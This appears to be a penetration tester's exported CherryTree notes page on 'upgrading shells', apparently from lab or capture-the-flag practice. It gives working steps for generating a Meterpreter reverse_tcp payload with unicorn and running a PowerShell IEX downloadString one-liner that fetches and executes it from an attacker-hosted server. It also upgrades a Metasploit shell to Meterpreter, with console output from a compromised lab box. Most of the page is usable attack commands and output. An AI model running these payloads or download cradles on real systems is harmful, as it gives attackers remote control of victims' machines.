<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Upgrading Shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Upgrading Shells</h1></strong><br /><br /><strong><h2>## Upgrade cmd/PowerShell to Meterpreter with Unicorn</h2></strong><br /><a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a><br /><br /><code>unicorn</code> will generate a powershell command that you can use to elevate to a shell.<br />Two files will be generated:<br />• <code>unicorn.rc</code> - contains a list of commands which load &amp; configure the listener in metasploit<br />• <code>powershell_attack.txt</code> - the powershell commnd itself<br />      ◇ (it&#39;ll be super long. avoid sending long commands - they usually freak out and don&#39;t work)<br /><br /><strong><h3>### How-to</h3></strong><br /><code>unicorn.py windows/meterpreter/reverse_tcp &lt;listening ip&gt; &lt;listening port&gt;</code><br /><code>unicorn.py windows/meterpreter/reverse_tcp 10.10.10.128 9001</code><br /><br />1. Start <code>exploit/multi/handler</code> listener in metasploit (make sure payload matches)<br />2. Serve <code>powershell_attack.txt</code> to target<br />3. <code>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.128/powershell_attack.txt&#39;)&quot;</code><br /><br /><strong><h3>### IppSec Method</h3></strong><br />1. Remove powershell commands from powershell_attack.txt (just want the payload itself), save as html<br />2. Set up metasploit using commands listed in unicorn.rc<br />3. Start a a simple HTTP server and serve powershell_attack.html - <code>python -m SimpleHTTPServer</code><br />4. On exploited machine with shell, run powershell commad to download file from http server and execute it<br /><br /><code>powershell &quot;IEX(New-Object Net.WebClient).downloadString(&#39;http://10.10.14.128/powershell_attack.html&#39;)&quot;</code><br /><br /><strong><h2>## Upgrade Metasploit shell to Meterpreter</h2></strong><br />If you already have a shell on the box using metasploit&#39;s listener - <code>exploit/multi/handler</code> - you can upgrade this session to a Meterpreter session.<br /><br /><strong><h3>### How-to</h3></strong><br />1. Background the current session with <code>Ctrl+Z</code><br />2. Upgrade the session you just backgrounded with <code>sessions -u</code><br />    Alternative command - <code>sessions -u N LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false</code><br />4. Connect to the upgraded session - <code>sessions -i N</code><br /><br /><strong><h3>### Example</h3></strong><br />Background the current session with <code>Ctrl+Z</code>.<br /><div class="codebox"><div class="codebox">C:\Windows\system32&gt;^Z<br />Background&nbsp;session&nbsp;3?&nbsp;[y/N]&nbsp;&nbsp;y</div></div><br /><br />Upgrade the session you just backgrounded with <code>sessions -u</code>.<br />The process usually hangs at the <code>[*] Stopping exploit/multi/handler</code> stage, be a little patient, and then try inputting a metasploit command. <br /><br />Connect to your newly upgraded session with <code>sessions -i</code>.<br /><div class="codebox"><div class="codebox">msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;sessions&nbsp;-u&nbsp;3<br />[*]&nbsp;Executing&nbsp;&#39;post/multi/manage/shell_to_meterpreter&#39;&nbsp;on&nbsp;session(s):&nbsp;[3]<br /><br />[*]&nbsp;Upgrading&nbsp;session&nbsp;ID:&nbsp;3<br />[*]&nbsp;Starting&nbsp;exploit/multi/handler<br />[*]&nbsp;Started&nbsp;reverse&nbsp;TCP&nbsp;handler&nbsp;on&nbsp;10.10.14.12:4433&nbsp;<br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;<br />[*]&nbsp;Sending&nbsp;stage&nbsp;(180291&nbsp;bytes)&nbsp;to&nbsp;10.10.10.74<br />[*]&nbsp;Meterpreter&nbsp;session&nbsp;4&nbsp;opened&nbsp;(10.10.14.12:4433&nbsp;-&gt;&nbsp;10.10.10.74:49160)&nbsp;at&nbsp;2019-10-30&nbsp;14:50:24&nbsp;+0000<br />[*]&nbsp;Stopping&nbsp;exploit/multi/handler<br />sessions<br /><br />Active&nbsp;sessions<br />===============<br /><br />&nbsp;&nbsp;Id&nbsp;&nbsp;Name&nbsp;&nbsp;Type&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Information&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Connection<br />&nbsp;&nbsp;--&nbsp;&nbsp;----&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-----------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----------<br />&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shell&nbsp;x86/windows&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;10.10.14.12:9001&nbsp;-&gt;&nbsp;10.10.10.74:49159&nbsp;(10.10.10.74)<br />&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meterpreter&nbsp;x86/windows&nbsp;&nbsp;CHATTERBOX\Alfred&nbsp;@&nbsp;CHATTERBOX&nbsp;&nbsp;10.10.14.12:4433&nbsp;-&gt;&nbsp;10.10.10.74:49160&nbsp;(10.10.10.74)<br /><br />msf5&nbsp;exploit(multi/handler)&nbsp;&gt;&nbsp;sessions&nbsp;-i&nbsp;4<br />[*]&nbsp;Starting&nbsp;interaction&nbsp;with&nbsp;4...<br /><br />meterpreter&nbsp;&gt;&nbsp;</div></div></div>
</body>
</html>
